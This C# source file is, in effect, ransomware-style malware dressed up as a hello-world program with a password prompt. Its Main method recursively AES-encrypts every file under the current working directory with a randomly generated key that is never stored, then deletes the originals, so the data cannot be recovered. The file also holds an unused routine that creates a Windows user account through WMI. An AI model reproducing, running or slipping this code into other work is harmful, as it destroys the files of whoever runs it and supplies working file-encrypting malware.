using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Text;
using System.Management;
class Program {
  private static Random random = new Random();
  
  static void print(string text) {
    Console.WriteLine(text);
  }
  public static void CreateWindowsUserProfile(string username, string password){
        ManagementObject newAccount = new ManagementClass("Win32_UserAccount").CreateInstance();    
        if (newAccount != null){
            newAccount["Name"] = username;
            newAccount["Password"] = password;
            newAccount["AccountType"] = 512; // User account type
            try {
                newAccount.Put();
                Console.WriteLine($"User profile for {username} created successfully.");
            }
            catch (ManagementException e){
                Console.WriteLine($"Failed to create user profile: {e.Message}");
            }
        }
        else{
            Console.WriteLine("Failed to create user profile.");
        }
    }


  public static string GenerateRandomString(int length){
      const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      StringBuilder stringBuilder = new StringBuilder(length);
      for (int i = 0; i < length; i++){
          stringBuilder.Append(chars[random.Next(chars.Length)]);
      }
      return stringBuilder.ToString();
  }
  
  static void EncryptFile(string inputFile, string key){
      string assemblyPath = Assembly.GetExecutingAssembly().Location;
      string sourceCodeFilePath = new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath;
      string[] dontDelete = {assemblyPath, sourceCodeFilePath};
      foreach (string path in dontDelete) {
        if(path == inputFile) {
          return;
        }
      }
      string noExtension = Path.GetFileNameWithoutExtension(inputFile);
      string outputFile = noExtension + ".enc";
      using (Aes aesAlg = Aes.Create()){
          aesAlg.Key = Convert.FromBase64String(key);
          aesAlg.GenerateIV();
      try {
          using (FileStream fsInput = new FileStream(inputFile, FileMode.Open))
          using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create))
          using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
          using (CryptoStream cryptoStream = new CryptoStream(fsOutput, encryptor, CryptoStreamMode.Write)){
              fsOutput.Write(aesAlg.IV, 0, aesAlg.IV.Length);
              byte[] buffer = new byte[4096];
              int bytesRead;
              while ((bytesRead = fsInput.Read(buffer, 0, buffer.Length)) > 0){
                  cryptoStream.Write(buffer, 0, bytesRead);
              }
          }
        }
        catch(Exception e){
          print("Error: " + e.Message);
          return;
        }
      }
    File.Delete(inputFile);
    print($"Encrypted file {inputFile} with password {key}");
  }

  static void recursiveEncryptionLoop(string startingDirectory, string password){
    string[] allFiles = Directory.GetFiles($@"{startingDirectory}", "*", SearchOption.AllDirectories);

    foreach (string file in allFiles){
        EncryptFile(file,password);
    }
  }

  static void Main (string[] args) {
    var del = File.Create("delete_me.txt");
    del.Close();
    var enc = File.Create("enc_me.txt");
    enc.Close();
    string text = "HelloWOr7D";
    string[] lines = {text};
    File.WriteAllLines("enc_me.txt",lines);
    EncryptFile("enc_me.txt","h4ndb81gqeoetw1ld63cgzmqw4kndkkv");
    recursiveEncryptionLoop(Directory.GetCurrentDirectory(), GenerateRandomString(32));
    Console.WriteLine ("Hello World");
    Console.WriteLine("Please enter password");
    string password = Console.ReadLine();
    if (password == "Hello"){
      Console.WriteLine($"Correct password!");
    }
    else {
      Console.WriteLine($"Incorrect password!");    
    }
  }
}